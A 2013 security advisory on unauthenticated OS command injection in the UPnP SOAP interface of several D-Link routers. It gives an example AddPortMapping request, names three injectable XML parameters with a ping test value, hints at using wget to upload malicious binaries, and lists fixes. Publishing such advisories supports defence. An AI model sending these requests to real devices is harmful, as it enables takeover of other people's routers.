@@ -1,0 +1,96 @@
+Title: OS-Command Injection via UPnP SOAP Interface in multiple D-Link devices
+
+Vendor: D-Link
+Devices: DIR-300 rev B / DIR-600 rev B / DIR-645 / DIR-845 / DIR-865
+
+============ Vulnerable Firmware Releases: ============ 
+DIR-300 rev B - 2.14b01
+DIR-600 - 2.16b01
+DIR-645 - 1.04b01
+DIR-845 - 1.01b02
+DIR-865 - 1.05b03
+
+Other devices and firmware versions may be also vulnerable.
+
+============ Vulnerability Overview: ============
+
+    * Unauthenticated OS Command Injection 
+
+The vulnerability is caused by missing input validation in different XML parameters. This vulnerability could be exploited to inject and execute arbitrary shell commands.
+
+WARNING: You do not need to be authenticated to the device to insert and execute malicious commands.
+Hint: On different devices wget is preinstalled and you are able to upload and execute your malicious binary.
+
+=> Parameter: NewInternalClient, NewInternalClient, NewInternalPort
+
+Example Request:
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
+Host: 10.8.28.133:49152
+Content-Type: text/xml
+Content-Length: 649
+
+<?xml version="1.0"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<SOAP-ENV:Body>
+<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
+<NewPortMappingDescription></NewPortMappingDescription>
+<NewLeaseDuration></NewLeaseDuration>
+<NewInternalClient>1.1.1.1</NewInternalClient>
+<NewEnabled>1</NewEnabled>
+<NewExternalPort>634</NewExternalPort>
+<NewRemoteHost></NewRemoteHost>
+<NewProtocol>TCP</NewProtocol>
+<NewInternalPort>45</NewInternalPort>
+</m:AddPortMapping>
+</SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+
+You could use miranda for your own testing:
+
+* NewInternalClient
+Required argument:
+	Argument Name:  NewInternalClient
+	Data Type:      string
+	Allowed Values: []
+	Set NewInternalClient value to: `ping 192.168.0.100`
+
+
+* NewExternalPort
+Required argument:
+	Argument Name:  NewExternalPort
+	Data Type:      ui2
+	Allowed Values: []
+	Set NewExternalPort value to: `ping 192.168.0.100`
+
+* NewInternalPort
+Required argument:
+	Argument Name:  NewInternalPort
+	Data Type:      ui2
+	Allowed Values: []
+	Set NewInternalPort value to: `ping 192.168.0.100`
+	
+============ Solution ============
+
+DIR-300 rev B - disable UPnP
+DIR-600 - update to v2.17b01
+DIR-645 - update to v1.04b11
+DIR-845 - update to v1.02b03
+DIR-865 - disable UPnP
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de/advisories
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+06.06.2013 - discovered vulnerability
+07.06.2013 - reported vulnerability to vendor
+=> some fixes are available but there is no communication with the vendor
+06.07.2013 - public disclosure at Sigint 2013
+06.07.2013 - public disclosure of advisory
+
+===================== Advisory end =====================
